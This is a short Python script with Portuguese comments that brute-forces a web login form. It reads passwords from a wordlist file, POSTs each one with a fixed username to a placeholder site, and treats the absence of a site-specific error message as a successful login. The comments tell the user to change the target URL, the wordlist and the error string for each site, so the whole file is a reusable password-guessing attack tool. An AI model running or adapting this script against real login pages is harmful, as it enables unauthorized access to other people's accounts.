import requests

url = 'https://www.site.com.br' #troca pro site desejado
try:
    arquivo = open ("dicionario.txt") #Muda o arquivo de keywords
    linhas = arquivo.readlines()
except:
    print("Arquivo não encontrado")

for linha in linhas:
    dados = {'coAcesso': 'nome', #O dicionário tem que ser mudado para cada site testato
             'coSenha': linha}

    resposta = requests.post(url, data=dados)

    print(resposta.text)

    if "tenho que resolver só isso pra rodar" in resposta.text: #A string de cada erro do site dever ser mudada
        print("Senha incorreta", linha)
    else:
        print("Senha correta", linha)
        break
